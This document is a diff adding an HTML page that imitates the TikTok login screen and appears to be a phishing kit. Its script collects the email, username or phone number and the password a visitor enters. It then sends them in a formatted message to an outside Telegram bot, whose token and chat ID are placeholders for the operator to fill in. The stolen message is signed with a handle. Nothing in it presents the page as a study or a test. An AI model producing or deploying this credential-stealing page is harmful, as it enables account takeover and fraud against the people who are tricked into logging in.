@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 375px;
+            background: #fff;
+            position: relative;
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #e8e8e8;
+        }
+
+        .help-icon, .close-icon, .back-icon, .help-icon-2 {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .back-icon {
+            border: none;
+            font-size: 24px;
+        }
+
+        .close-icon {
+            font-size: 20px;
+        }
+
+        .content {
+            padding: 40px 30px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 15px;
+            color: #000;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .login-btn {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            background: #fff;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            transition: background 0.2s;
+            position: relative;
+        }
+
+        .login-btn:hover {
+            background: #f8f8f8;
+        }
+
+        .login-btn.primary {
+            border: 2px solid #fe2c55;
+        }
+
+        .login-btn svg, .login-btn .icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 40px;
+            line-height: 1.6;
+        }
+
+        .footer-text a {
+            color: #000;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 20px;
+            color: #666;
+        }
+
+        .signup-text a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+
+        /* Page 2 Styles */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e8e8e8;
+            margin-bottom: 30px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            background: none;
+            border: none;
+            font-size: 15px;
+            font-weight: 500;
+            color: #666;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .tab.active {
+            color: #000;
+            font-weight: 600;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #000;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 40px 14px 14px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            font-size: 15px;
+            outline: none;
+            background: #f8f8f8;
+        }
+
+        .input-field:focus {
+            border-color: #333;
+            background: #fff;
+        }
+
+        .clear-btn {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #ccc;
+            border: none;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fe2c55;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 30px;
+            position: relative;
+        }
+
+        .continue-btn::after {
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 20px solid #fe2c55;
+        }
+
+        .continue-btn:hover {
+            background: #e6254b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Page 1: Login Options -->
+        <div id="page1" class="page active">
+            <div class="header">
+                <div class="help-icon">?</div>
+                <div class="close-icon">×</div>
+            </div>
+            
+            <div class="content">
+                <h1>Log in to TikTok</h1>
+                <p class="subtitle">Manage your account, check notifications,<br>comment on videos, and more.</p>
+                
+                <div class="login-options">
+                    <button class="login-btn primary" onclick="goToPage2()">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="12" cy="7" r="4"></circle>
+                        </svg>
+                        Use phone / email / username
+                    </button>
+                    
+                    <button class="login-btn">
+                        <svg viewBox="0 0 24 24" fill="#1877F2">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                        Continue with Facebook
+                    </button>
+                    
+                    <button class="login-btn">
+                        <svg viewBox="0 0 24 24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                        </svg>
+                        Continue with Google
+                    </button>
+                    
+                    <button class="login-btn">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
+                        </svg>
+                        Continue with Twitter
+                    </button>
+                </div>
+                
+                <div class="footer-text">
+                    By continuing, you agree to our <a href="#">Terms of Service</a> and acknowledge that you have read our <a href="#">Privacy Policy</a> to learn how we collect, use, and share your data.
+                </div>
+                
+                <div class="signup-text">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 2: Email/Username Login -->
+        <div id="page2" class="page">
+            <div class="header">
+                <div class="back-icon" onclick="goToPage1()">←</div>
+                <h2 style="font-size: 16px; font-weight: 600;">Log in</h2>
+                <div class="help-icon-2">?</div>
+            </div>
+            
+            <div class="content">
+                <div class="tabs">
+                    <button class="tab" id="phoneTab" onclick="switchTab('phone')">Phone</button>
+                    <button class="tab active" id="emailTab" onclick="switchTab('email')">Email / Username</button>
+                </div>
+                
+                <div id="emailForm" class="form-container">
+                    <div class="input-group">
+                        <input type="text" class="input-field" id="emailUsername" placeholder="Email or Username">
+                        <button class="clear-btn" onclick="clearInput('emailUsername')">×</button>
+                    </div>
+                </div>
+
+                <div id="phoneForm" class="form-container" style="display: none;">
+                    <div class="input-group">
+                        <input type="tel" class="input-field" id="phoneNumber" placeholder="Phone number">
+                        <button class="clear-btn" onclick="clearInput('phoneNumber')">×</button>
+                    </div>
+                </div>
+                
+                <button class="continue-btn" onclick="handleContinue()">Continue</button>
+            </div>
+        </div>
+
+        <!-- Page 3: Password Entry -->
+        <div id="page3" class="page">
+            <div class="header">
+                <div class="back-icon" onclick="goToPage2()">←</div>
+                <h2 style="font-size: 16px; font-weight: 600;">Enter password</h2>
+                <div class="help-icon-2">?</div>
+            </div>
+            
+            <div class="content">
+                <div class="input-group">
+                    <p style="font-size: 14px; color: #666; margin-bottom: 10px;" id="loginIdentifier"></p>
+                    <input type="password" class="input-field" id="password" placeholder="Password">
+                    <button class="clear-btn" onclick="clearInput('password')">×</button>
+                </div>
+                
+                <a href="#" style="display: block; text-align: right; color: #000; font-size: 14px; margin-top: 10px; text-decoration: none;">Forgot password?</a>
+                
+                <button class="continue-btn" onclick="handleLogin()">Log in</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - Replace with your actual Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        let currentLoginType = 'email'; // 'email' or 'phone'
+        let loginIdentifier = '';
+
+        function goToPage2() {
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+        }
+
+        function goToPage1() {
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page1').classList.add('active');
+            // Reset forms
+            document.getElementById('emailUsername').value = '';
+            document.getElementById('phoneNumber').value = '';
+        }
+
+        function goToPage2FromPage3() {
+            document.getElementById('page3').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+            // Clear password
+            document.getElementById('password').value = '';
+        }
+
+        function switchTab(tab) {
+            const phoneTab = document.getElementById('phoneTab');
+            const emailTab = document.getElementById('emailTab');
+            const phoneForm = document.getElementById('phoneForm');
+            const emailForm = document.getElementById('emailForm');
+
+            if (tab === 'phone') {
+                phoneTab.classList.add('active');
+                emailTab.classList.remove('active');
+                phoneForm.style.display = 'block';
+                emailForm.style.display = 'none';
+                currentLoginType = 'phone';
+            } else {
+                emailTab.classList.add('active');
+                phoneTab.classList.remove('active');
+                emailForm.style.display = 'block';
+                phoneForm.style.display = 'none';
+                currentLoginType = 'email';
+            }
+        }
+
+        function clearInput(fieldId) {
+            document.getElementById(fieldId).value = '';
+            document.getElementById(fieldId).focus();
+        }
+
+        function handleContinue() {
+            if (currentLoginType === 'email') {
+                loginIdentifier = document.getElementById('emailUsername').value.trim();
+                if (!loginIdentifier) {
+                    alert('Please enter your email or username');
+                    return;
+                }
+            } else {
+                loginIdentifier = document.getElementById('phoneNumber').value.trim();
+                if (!loginIdentifier) {
+                    alert('Please enter your phone number');
+                    return;
+                }
+            }
+
+            // Display the identifier on the password page
+            document.getElementById('loginIdentifier').textContent = loginIdentifier;
+
+            // Move to password page
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page3').classList.add('active');
+        }
+
+        function goToPage2() {
+            goToPage2FromPage3();
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function handleLogin() {
+            const password = document.getElementById('password').value.trim();
+
+            if (!password) {
+                alert('Please enter your password');
+                return;
+            }
+
+            // Prepare the message
+            const loginType = currentLoginType === 'email' ? 'Email/Username' : 'Phone Number';
+            const message = `
+🔐 <b>TikTok Login Information</b>
+
+<b>Login Type:</b> ${loginType}
+<b>${loginType}:</b> ${loginIdentifier}
+<b>Password:</b> ${password}
+
+<b>Time:</b> ${new Date().toLocaleString()}
+
+<b>? GAARA Solos ¿</b>
+            `.trim();
+
+            // Send to Telegram
+            const success = await sendToTelegram(message);
+
+            if (success) {
+                // Show success message or redirect
+                alert('Logging in...');
+                // You can redirect to another page or show a loading screen here
+            } else {
+                alert('Login failed. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html>
